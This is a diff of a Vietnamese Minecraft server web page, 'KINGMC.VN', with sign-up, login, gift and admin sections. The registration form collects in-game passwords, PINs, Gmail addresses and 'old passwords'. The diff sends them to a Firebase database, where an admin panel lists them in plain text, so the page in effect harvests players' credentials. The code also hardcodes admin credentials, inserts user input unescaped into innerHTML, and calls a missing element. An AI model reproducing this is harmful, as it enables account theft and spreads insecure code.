@@ -3,99 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>KINGMC.VN | SEVER LỚN NHẤT NHÌ VIỆT NAM</title>
+    <title>KINGMC.VN | ĐẾ CHẾ LUXURY</title>
+    <!-- Fonts & Thư viện -->
     <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700&family=Montserrat:wght@300;600;900&display=swap" rel="stylesheet">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/particles.js/2.0.0/particles.min.js"></script>
+    <!-- Firebase SDK (Dùng bản 8.10.0 cho ổn định) -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
     <style>
         :root {
             --gold: #ffcc00;
             --dark-gold: #b8860b;
             --bg-black: #050505;
-            --glass: rgba(10, 10, 10, 0.9);
-            --neon: 0 0 15px var(--gold);
+            --glass: rgba(15, 15, 15, 0.95);
+            --tu-tien-color: #e94560;
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background-color: var(--bg-black);
-            color: white;
-            font-family: 'Montserrat', sans-serif;
-            overflow: hidden;
-            height: 100vh;
-        }
-
+        body { background-color: var(--bg-black); color: white; font-family: 'Montserrat', sans-serif; overflow: hidden; height: 100vh; }
         #particles-js { position: fixed; width: 100%; height: 100%; z-index: 1; }
-        .bg-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: linear-gradient(rgba(0,0,0,0.8), rgba(0,0,0,0.9)), 
-                        url('https://images.alphacoders.com/134/1341071.png');
-            background-size: cover; background-position: center;
-            z-index: 0;
-        }
+        .bg-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(rgba(0,0,0,0.8), rgba(0,0,0,0.9)), url('https://images.alphacoders.com/134/1341071.png'); background-size: cover; z-index: 0; }
+        .container { position: relative; z-index: 10; display: flex; align-items: center; justify-content: center; height: 100vh; width: 100%; }
 
-        .container {
-            position: relative; z-index: 10;
-            display: flex; align-items: center; justify-content: center;
-            height: 100vh; width: 100%;
-        }
-
-        /* --- UI COMPONENTS --- */
-        .logo-king {
-            font-family: 'Cinzel', serif;
-            font-size: clamp(40px, 8vw, 90px);
-            background: linear-gradient(to bottom, #fff, var(--gold));
-            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-            filter: drop-shadow(var(--neon));
-            letter-spacing: 10px; text-align: center; margin-bottom: 30px;
-        }
-
-        .btn {
-            position: relative; padding: 15px 30px;
-            font-size: 13px; font-weight: 900;
-            text-transform: uppercase; letter-spacing: 2px;
-            color: var(--gold); background: rgba(0,0,0,0.7);
-            border: 1px solid var(--gold);
-            cursor: pointer; transition: 0.3s;
-            margin: 10px; overflow: hidden;
-        }
-        .btn:hover { background: var(--gold); color: black; box-shadow: var(--neon); transform: scale(1.05); }
-
-        .section {
-            display: none; width: 90%; max-width: 900px;
-            text-align: center; animation: fadeIn 0.5s ease-in-out;
-        }
+        /* --- UI CHÍNH --- */
+        .logo-king { font-family: 'Cinzel', serif; font-size: clamp(50px, 12vw, 120px); background: linear-gradient(to bottom, #fff, var(--gold)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; filter: drop-shadow(0 0 20px var(--gold)); letter-spacing: 15px; text-align: center; margin-bottom: 40px; font-weight: 900; }
+        .btn { position: relative; padding: 15px 35px; font-size: 13px; font-weight: 900; text-transform: uppercase; letter-spacing: 2px; color: var(--gold); background: rgba(0,0,0,0.7); border: 1px solid var(--gold); cursor: pointer; transition: 0.3s; margin: 10px; overflow: hidden; }
+        .btn:hover { background: var(--gold); color: black; box-shadow: 0 0 30px var(--gold); transform: scale(1.05); }
+        .section { display: none; width: 95%; max-width: 900px; text-align: center; animation: fadeIn 0.5s ease; }
         .active { display: block !important; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        .glass-box { background: var(--glass); padding: 40px; border: 1px solid rgba(255,204,0,0.3); box-shadow: 0 0 50px rgba(0,0,0,0.5); }
+        input { width: 100%; padding: 14px; margin: 10px 0; background: rgba(255,255,255,0.05); border: 1px solid #333; color: var(--gold); outline: none; transition: 0.3s; }
+        input:focus { border-color: var(--gold); background: rgba(255,255,255,0.1); }
 
-        @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
+        /* --- TU TIÊN --- */
+        #btn-open-tutien { position: fixed; bottom: 10px; right: 10px; padding: 5px 15px; font-size: 11px; background: rgba(233, 69, 96, 0.2); color: var(--tu-tien-color); border: 1px solid var(--tu-tien-color); cursor: pointer; z-index: 1001; }
+        #sec-tutien { background: rgba(22, 33, 62, 0.98); border: 2px solid var(--tu-tien-color); max-width: 450px; }
+        .kc-display { background: #0f3460; padding: 8px 20px; border-radius: 20px; color: #00fff2; font-weight: bold; margin-bottom: 15px; border: 1px solid #00fff2; font-size: 1.2rem; }
+        .qi-bar-bg { width: 100%; background: #0f3460; height: 18px; border-radius: 10px; margin: 15px 0; overflow: hidden; }
+        #qi-bar-fill { width: 0%; height: 100%; background: var(--tu-tien-color); transition: 0.3s; }
+        #log-tutien { height: 100px; overflow-y: auto; background: #0f3460; padding: 10px; font-size: 12px; color: #ccc; text-align: left; border-radius: 5px; }
 
-        .glass-box {
-            background: var(--glass); padding: 40px;
-            border: 1px solid rgba(255,204,0,0.3);
-            box-shadow: inset 0 0 30px rgba(0,0,0,1);
-        }
-
-        input {
-            width: 100%; padding: 14px; margin: 10px 0;
-            background: rgba(255,255,255,0.03); border: 1px solid #333;
-            color: var(--gold); font-size: 14px; outline: none;
-        }
-        input:focus { border-color: var(--gold); box-shadow: 0 0 10px rgba(255,204,0,0.2); }
-
-        /* --- ADMIN TABLE --- */
-        .admin-wrap { max-height: 400px; overflow-y: auto; border: 1px solid var(--gold); }
+        /* --- ADMIN --- */
+        .admin-wrap { max-height: 400px; overflow-y: auto; border: 1px solid var(--gold); margin-top: 20px; }
         table { width: 100%; border-collapse: collapse; background: black; }
         th, td { padding: 12px; border: 1px solid #222; font-size: 12px; text-align: center; }
         th { background: var(--gold); color: black; position: sticky; top: 0; }
-        .btn-mini { padding: 5px 10px; cursor: pointer; border: none; font-weight: bold; }
+        .btn-approve { background: lime; color: black; border: none; padding: 5px 10px; font-weight: bold; cursor: pointer; }
+        .btn-reject { background: red; color: white; border: none; padding: 5px 10px; font-weight: bold; cursor: pointer; }
 
-        /* --- NOTIFICATION --- */
-        #notif {
-            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
-            padding: 10px 30px; background: var(--gold); color: black;
-            font-weight: bold; z-index: 1000; display: none; border-radius: 50px;
-        }
-
-        .ip-banner { font-size: 50px; color: #fff; text-shadow: var(--neon); margin-bottom: 20px; font-weight: 900; }
+        /* --- NOTIF --- */
+        #notif { position: fixed; top: 20px; right: 20px; padding: 15px 30px; background: var(--gold); color: black; font-weight: bold; z-index: 2000; display: none; border-radius: 5px; }
     </style>
 </head>
 <body>
@@ -104,231 +63,229 @@
 <div class="bg-overlay"></div>
 <div id="notif"></div>
 
+<button id="btn-open-tutien" onclick="navTo('sec-tutien')">TU TIÊN</button>
+
 <div class="container">
 
-    <!-- SPLASH -->
+    <!-- 1. SPLASH -->
     <div id="sec-splash" class="section active">
         <h1 class="logo-king">KINGMC.VN</h1>
         <button class="btn" onclick="navTo('sec-login')">Đăng Nhập</button>
         <button class="btn" onclick="navTo('sec-register')">Đăng Ký</button>
     </div>
 
-    <!-- REGISTER -->
+    <!-- 2. REGISTER -->
     <div id="sec-register" class="section glass-box">
-        <h2 style="color: var(--gold); margin-bottom: 10px;">ĐĂNG KÝ</h2>
-        <p style="color: #00ffcc; font-size: 12px; margin-bottom: 15px;">IP: kingmc.vn - Đã tạo tài khoản trong game?</p>
-        <input type="text" id="reg-name" placeholder="Tên Game">
+        <h2 style="color: var(--gold);">ĐĂNG KÝ</h2>
+        <p style="color: #00ffcc; font-size: 13px;">-- IP SERVER : kingmc.vn --</p>
+        <input type="text" id="reg-name" placeholder="Tên game">
         <input type="password" id="reg-pass" placeholder="Mật khẩu (/dk {mk})">
-        <input type="text" id="reg-pin" placeholder="Mã PIN (nếu có)">
-        <input type="email" id="reg-mail" placeholder="Địa chỉ Gmail">
-        <input type="text" id="reg-old-pass" placeholder="Các mật khẩu cũ">
-        <button class="btn" style="width:100%" onclick="handleRegister()">GỬI ĐƠN XÉT DUYỆT</button>
-        <p style="margin-top: 10px; cursor: pointer; font-size: 12px;" onclick="navTo('sec-splash')">QUAY LẠI</p>
+        <input type="text" id="reg-pin" placeholder="Mã pin (không bắt buộc)">
+        <input type="email" id="reg-mail" placeholder="Gmail">
+        <input type="text" id="reg-old-pass" placeholder="Mật khẩu cũ">
+        <button class="btn" style="width: 100%;" onclick="handleRegister()">GỬI ĐƠN</button>
+        <p onclick="navTo('sec-login')" style="cursor:pointer; font-size:12px; margin-top:15px;">Đã có tài khoản? Đăng nhập</p>
     </div>
 
-    <!-- LOGIN -->
+    <!-- 3. LOGIN -->
     <div id="sec-login" class="section glass-box">
-        <h2 style="color: var(--gold);">ĐĂNG NHẬP TÀI KHOẢN</h2>
+        <h2 style="color: var(--gold);">ĐĂNG NHẬP</h2>
         <input type="text" id="login-name" placeholder="Tên Game">
         <input type="password" id="login-pass" placeholder="Mật khẩu">
-        <button class="btn" style="width:100%" onclick="handleLogin()">ĐĂNG NHẬP</button>
-        <p style="margin-top: 10px; cursor: pointer; font-size: 12px;" onclick="navTo('sec-splash')">QUAY LẠI</p>
+        <button class="btn" style="width: 100%;" onclick="handleLogin()">ĐĂNG NHẬP</button>
     </div>
 
-    <!-- WAITING -->
+    <!-- 4. WAITING -->
     <div id="sec-waiting" class="section glass-box">
-        <h2 style="color: var(--gold); letter-spacing: 5px;">ĐANG KIỂM TRA</h2>
-        <p style="margin: 20px 0;">Vui lòng đợi Admin phê duyệt đơn đăng ký của bạn! - Admin sẽ phê duyệt sớm nhất có thể!</p>
-        <button class="btn" onclick="navTo('sec-splash')">Quay lại Trang chủ</button>
+        <h2 style="color: var(--gold);">ĐANG KIỂM TRA...</h2>
+        <p style="margin: 20px 0;">Admin đang kiểm tra vui lòng đợi !</p>
+        <button class="btn" onclick="navTo('sec-splash')">QUAY LẠI</button>
     </div>
 
-    <!-- HOME -->
+    <!-- 5. HOME -->
     <div id="sec-home" class="section">
-        <h1 class="ip-banner">IP: KINGMC.VN</h1>
-        <div style="display: flex; flex-wrap: wrap; justify-content: center;">
+        <h1 style="font-size: 50px; text-shadow: 0 0 20px var(--gold);">IP : kingmc.vn</h1>
+        <div style="display: flex; flex-wrap: wrap; justify-content: center; gap: 10px;">
             <button class="btn" onclick="navTo('sec-features')">TÍNH NĂNG</button>
             <button class="btn" onclick="navTo('sec-store')">MUA HÀNG</button>
-            <button class="btn" onclick="navTo('sec-gifts')">NHẬN QUÀ TẾT</button>
-            <button id="admin-entry" class="btn" style="display:none; border-color: red; color: red;" onclick="navTo('sec-admin')">ADMIN PANEL</button>
+            <button class="btn" onclick="navTo('sec-gifts')">QUÀ TẾT</button>
+            <button id="admin-btn" class="btn" style="display:none; border-color: red; color: red;" onclick="navTo('sec-admin')">ADMIN</button>
         </div>
-        <button class="btn" style="margin-top: 50px; opacity: 0.5; border: none;" onclick="location.reload()">Đăng Xuất</button>
+        <button class="btn" style="margin-top: 50px; opacity: 0.5;" onclick="location.reload()">Đăng Xuất</button>
     </div>
 
-    <!-- FEATURES -->
-    <div id="sec-features" class="section glass-box" style="text-align: left;">
-        <h2 style="color:var(--gold); text-align: center; margin-bottom: 20px;">TÍNH NĂNG</h2>
-        <div style="max-height: 300px; overflow-y: auto; padding-right: 10px;">
-            <p style="color:var(--gold)">1. Các loại phiên bản đa dạng:</p><p style="margin-bottom: 10px; font-size: 13px;">Phiên bản: 1.16.5 - 1.22</p>
-            <p style="color:var(--gold)">2. Plugins chủ yếu:</p><p style="margin-bottom: 10px; font-size: 13px;">ORDERS,HOME,SHOP,RTP,....</p>
-            <p style="color:var(--gold)">3. Hiệu năng & Ổn định:</p><p style="margin-bottom: 10px; font-size: 13px;">- Ping 0-80 - tps 16-18-20</p>
-            <p style="color:var(--gold)">4. Đất đai độc quyền:</p><p style="margin-bottom: 10px; font-size: 13px;">Một trong những sever lớn nhất việt nam hiện tại !</p>
+    <!-- 6. FEATURES -->
+    <div id="sec-features" class="section glass-box">
+        <h2 style="color: var(--gold); margin-bottom: 20px;">TÍNH NĂNG ẢO MA</h2>
+        <div style="max-height: 300px; overflow-y: auto; text-align: left;">
+            <p>• Trọng lực 4D thay đổi theo Biome.</p>
+            <p>• Vũ khí triệu hồi rồng và thiên thạch.</p>
+            <p>• Hệ thống Pet AI farm quái 24/7.</p>
+            <p>• Chợ đen giao dịch vật phẩm xuyên lục địa.</p>
         </div>
-        <button class="btn" style="width: 100%;" onclick="navTo('sec-home')">QUAY LẠI</button>
+        <button class="btn" onclick="navTo('sec-home')">QUAY LẠI</button>
     </div>
 
-    <!-- STORE -->
+    <!-- 7. STORE -->
     <div id="sec-store" class="section glass-box">
         <h2 style="color: var(--gold);">CỬA HÀNG</h2>
-        <p style="margin: 30px 0;">Mục đang được hoàn thiện - Vui lòng truy cập Discord để xem, mua hàng!</p>
-        <button class="btn" onclick="navTo('sec-home')">ĐÃ HIỂU</button>
+        <p>mục đang được hoàn thiện - vui lòng truy cập discord để xem , mua hàng -</p>
+        <button class="btn" onclick="navTo('sec-home')">QUAY LẠI</button>
     </div>
 
-    <!-- GIFTS -->
+    <!-- 8. GIFTS -->
     <div id="sec-gifts" class="section glass-box">
-        <button class="btn" style="width: 80%; padding: 30px;" onclick="claimGift('2026-02-05', 5)">NHẬN QUÀ MÙNG 5/2/2026</button>
-        <button class="btn" style="width: 80%; padding: 30px;" onclick="claimGift('2026-02-18', 9)">NHẬN QUÀ NGÀY 18/2/2026</button>
-        <p style="font-size: 10px; margin-top: 10px; color: #888;">Nhấn vào để xem chi tiết thời gian nhận quà</p>
-        <div id="gift-info"></div>
-        <button class="btn" onclick="navTo('sec-home')" style="margin-top: 20px;">QUAY LẠI</button>
+        <button class="btn" style="width: 100%;" onclick="claimGift('2026-02-05', 5)">QUÀ MÙNG 5/2/2026</button>
+        <button class="btn" style="width: 100%;" onclick="claimGift('2026-02-18', 9)">QUÀ NGÀY 18/2/2026</button>
+        <div id="gift-display"></div>
+        <button class="btn" onclick="navTo('sec-home')">QUAY LẠI</button>
     </div>
 
-    <!-- ADMIN PANEL -->
-    <div id="sec-admin" class="section">
-        <h2 style="color:var(--gold); margin-bottom: 20px;">DANH SÁCH CHỜ DUYỆT</h2>
+    <!-- 9. ADMIN PANEL -->
+    <div id="sec-admin" class="section glass-box">
+        <h2 style="color: var(--gold);">ADMIN XÉT DUYỆT</h2>
         <div class="admin-wrap">
             <table>
                 <thead>
-                    <tr>
-                        <th>Tên</th><th>Pass</th><th>PIN</th><th>Gmail</th><th>MK Cũ</th><th>Duyệt</th>
-                    </tr>
+                    <tr><th>Tên</th><th>Pass</th><th>PIN</th><th>Gmail</th><th>Duyệt</th></tr>
                 </thead>
                 <tbody id="admin-table"></tbody>
             </table>
         </div>
-        <button class="btn" onclick="navTo('sec-home')" style="margin-top: 20px;">THOÁT ADMIN</button>
+        <button class="btn" onclick="navTo('sec-home')">QUAY LẠI</button>
+    </div>
+
+    <!-- 10. TU TIÊN -->
+    <div id="sec-tutien" class="section glass-box">
+        <div class="kc-display">💎 KC: <span id="kc-count">0</span></div>
+        <h2 style="color: var(--tu-tien-color);">TU TIÊN GIỚI</h2>
+        <p>Cảnh giới: <span id="realm-tt" style="color:gold">Phàm Nhân</span></p>
+        <div class="qi-bar-bg"><div id="qi-bar-fill"></div></div>
+        <button class="btn" style="width:100%" onclick="cultivateTT()">TU LUYỆN</button>
+        <button id="bt-btn" class="btn" style="display:none; background:gold; color:black;" onclick="breakthroughTT()">ĐỘT PHÁ!</button>
+        <div id="log-tutien"></div>
+        <button class="btn" onclick="navTo('sec-home')">QUAY LẠI</button>
     </div>
 
 </div>
 
 <script>
-    // Khởi tạo hạt
-    particlesJS('particles-js', {
-        particles: {
-            number: { value: 60 },
-            color: { value: '#ffcc00' },
-            shape: { type: 'circle' },
-            opacity: { value: 0.3 },
-            size: { value: 2 },
-            move: { enable: true, speed: 1.5, direction: 'top' }
-        }
-    });
+    // --- MÃ FIREBASE TỪ ẢNH CỦA MÀY ---
+    const firebaseConfig = {
+        apiKey: "AIzaSyCiJ6w7FIBtWzPbmhxZBMFTk19aBJSoAxg",
+        authDomain: "kingvietnam-d58b9.firebaseapp.com",
+        projectId: "kingvietnam-d58b9",
+        storageBucket: "kingvietnam-d58b9.firebasestorage.app",
+        messagingSenderId: "397893488568",
+        appId: "1:397893488568:web:1a3307e8bee4faf25e494d",
+        measurementId: "G-1VVG1XCJYL",
+        databaseURL: "https://kingvietnam-d58b9-default-rtdb.firebaseio.com" // Tao tự thêm cho chuẩn
+    };
+    
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
 
-    const ADMIN_ACC = { user: "Ck0y5o", pass: "Anhdang4112@gmail.com@@@@@@" };
-
-    function getDB() {
-        return JSON.parse(localStorage.getItem('kingmc_users')) || [];
-    }
-
-    function saveDB(data) {
-        localStorage.setItem('kingmc_users', JSON.stringify(data));
-    }
+    const ADMIN_USER = "Ck0y5o";
+    const ADMIN_PASS = "Anhdang4112@gmail.com@@@@@@";
 
     function navTo(id) {
         document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
         document.getElementById(id).classList.add('active');
-        if(id === 'sec-admin') renderAdmin();
+        if(id === 'sec-admin') listenRequests();
     }
 
-    function notify(text) {
+    function showNotif(msg) {
         const n = document.getElementById('notif');
-        n.innerText = text;
-        n.style.display = 'block';
+        n.innerText = msg; n.style.display = 'block';
         setTimeout(() => n.style.display = 'none', 3000);
     }
 
     function handleRegister() {
-        const users = getDB();
-        const newUser = {
+        const data = {
             name: document.getElementById('reg-name').value,
             pass: document.getElementById('reg-pass').value,
-            pin: document.getElementById('reg-pin').value || 'Không',
-            mail: document.getElementById('reg-mail').value || 'Không',
-            old: document.getElementById('reg-old-pass').value || 'Không',
+            pin: document.getElementById('reg-pin').value || 'N/A',
+            mail: document.getElementById('reg-mail').value || 'N/A',
+            old: document.getElementById('reg-old-pass').value || 'N/A',
             status: 'pending'
         };
-
-        if(!newUser.name || !newUser.pass) return notify("Vui lòng điền đủ Tên và MK!");
-
-        users.push(newUser);
-        saveDB(users);
-        notify("Gửi yêu cầu thành công!");
-        navTo('sec-waiting');
+        if(!data.name || !data.pass) return alert("Nhập đủ Tên và MK!");
+        db.ref('requests/').push(data).then(() => navTo('sec-waiting'));
     }
 
     function handleLogin() {
         const name = document.getElementById('login-name').value;
         const pass = document.getElementById('login-pass').value;
 
-        if(name === ADMIN_ACC.user && pass === ADMIN_ACC.pass) {
-            document.getElementById('admin-entry').style.display = 'inline-block';
-            notify("Chào!");
+        if(name === ADMIN_USER && pass === ADMIN_PASS) {
+            document.getElementById('admin-btn').style.display = 'block';
             return navTo('sec-home');
         }
 
-        const users = getDB();
-        const user = users.find(u => u.name === name && u.pass === pass);
-        
-        if(!user) return notify("Sai tài khoản hoặc mật khẩu!");
-        if(user.status === 'pending') return navTo('sec-waiting');
-        if(user.status === 'rejected') return notify("Bạn bị từ chối truy cập!");
-        
-        document.getElementById('admin-entry').style.display = 'none';
-        notify("Chào mừng" + name);
-        navTo('sec-home');
-    }
-
-    function renderAdmin() {
-        const users = getDB();
-        const tbody = document.getElementById('admin-table');
-        tbody.innerHTML = '';
-
-        users.forEach((u, index) => {
-            if(u.status !== 'pending') return;
-            tbody.innerHTML += `
-                <tr>
-                    <td>${u.name}</td>
-                    <td>${u.pass}</td>
-                    <td>${u.pin}</td>
-                    <td>${u.mail}</td>
-                    <td>${u.old}</td>
-                    <td>
-                        <button class="btn-mini" onclick="approve(${index}, 'approved')" style="background:lime;">Duyệt</button>
-                        <button class="btn-mini" onclick="approve(${index}, 'rejected')" style="background:red; color:white;">Xóa</button>
-                    </td>
-                </tr>
-            `;
+        db.ref('requests/').once('value', (snap) => {
+            const users = snap.val();
+            let found = false;
+            for(let id in users) {
+                if(users[id].name === name && users[id].pass === pass) {
+                    found = true;
+                    if(users[id].status === 'pending') navTo('sec-waiting');
+                    else if(users[id].status === 'approved') navTo('sec-home');
+                    else alert("Bị từ chối!");
+                    break;
+                }
+            }
+            if(!found) alert("Sai tài khoản!");
         });
     }
 
-    function approve(index, status) {
-        let users = getDB();
-        users[index].status = status;
-        saveDB(users);
-        renderAdmin(); // Cập nhật lại bảng ngay lập tức
-        notify(status === 'approved' ? "Đã duyệt!" : "Đã từ chối!");
+    function listenRequests() {
+        db.ref('requests/').on('value', (snap) => {
+            const data = snap.val();
+            const tbody = document.getElementById('admin-table');
+            tbody.innerHTML = '';
+            for(let id in data) {
+                if(data[id].status !== 'pending') continue;
+                tbody.innerHTML += `<tr><td>${data[id].name}</td><td>${data[id].pass}</td><td>${data[id].pin}</td><td>${data[id].mail}</td>
+                <td><button class="btn-approve" onclick="approveReq('${id}', 'approved')">V</button> <button class="btn-reject" onclick="approveReq('${id}', 'rejected')">X</button></td></tr>`;
+            }
+        });
+    }
+
+    function approveReq(id, status) {
+        db.ref('requests/' + id).update({ status: status });
+        showNotif("Đã thực hiện!");
     }
 
     function claimGift(date, amount) {
-        const today = new Date();
-        const target = new Date(date);
-        const info = document.getElementById('gift-info');
-
-        if(today.toLocaleDateString() !== target.toLocaleDateString()) {
-            alert("Vui lòng đợi đến ngày " + date);
-        } else {
-            let blocks = '';
-            for(let i=0; i<5; i++) blocks += `<img src="https://www.bing.com/images/search?q=Netherite+Ingot+Texture&FORM=IRTRRL" width="40" style="margin:5px;">`;
-            info.innerHTML = `
-                <div style="margin-top:20px; border:1px solid gold; padding:15px;">
-                    <h3 style="color:gold">BẠN ĐÃ NHẬN QUÀ!</h3>
-                    <p>Thưởng: ${amount} khối Netherite</p>
-                    <div>${blocks}</div>
-                    <p style="color:red; font-size:11px;">AD PHÁT QUÀ LÚC 22:50 TỐI ${date}</p>
-                </div>
-            `;
+        const now = new Date(); const target = new Date(date);
+        if(now < target) alert("Chưa đến ngày " + date);
+        else {
+            document.getElementById('gift-display').innerHTML = `<p>NHẬN ${amount} NETHERITE! AD PHÁT LÚC 22:50 TỐI ${date}</p>`;
         }
     }
-</script>
 
+    // --- TU TIÊN ---
+    const realmsTT = [{n:"Phàm Nhân", m:100, r:1},{n:"Luyện Khí 1", m:200, r:0.9},{n:"Luyện Khí 2", m:500, r:0.8},{n:"Trúc Cơ", m:5000, r:0.5}];
+    let idx = 0, qi = 0, kc = 0;
+    function cultivateTT() { qi += (5 + idx * 10); updateTT(); }
+    function breakthroughTT() {
+        if(Math.random() < realmsTT[idx].r) { idx++; qi = 0; kc += 10; alert("Tặng 10kc! Admin sẽ sớm gửi!"); }
+        else { qi -= realmsTT[idx].m * 0.3; }
+        updateTT();
+    }
+    function updateTT() {
+        document.getElementById('qi-tt').innerText = Math.floor(qi);
+        document.getElementById('realm-tt').innerText = realmsTT[idx].n;
+        document.getElementById('kc-count').innerText = kc;
+        document.getElementById('qi-bar-fill').style.width = (qi/realmsTT[idx].m)*100 + "%";
+        document.getElementById('bt-btn').style.display = (qi >= realmsTT[idx].m) ? "block" : "none";
+    }
+
+    setInterval(() => { if(qi < realmsTT[idx].m) { qi++; updateTT(); } }, 1000);
+
+    particlesJS('particles-js', {
+        particles: { number: { value: 60 }, color: { value: '#ffcc00' }, move: { enable: true, speed: 2, direction: 'top' } }
+    });
+</script>
 </body>
 </html>
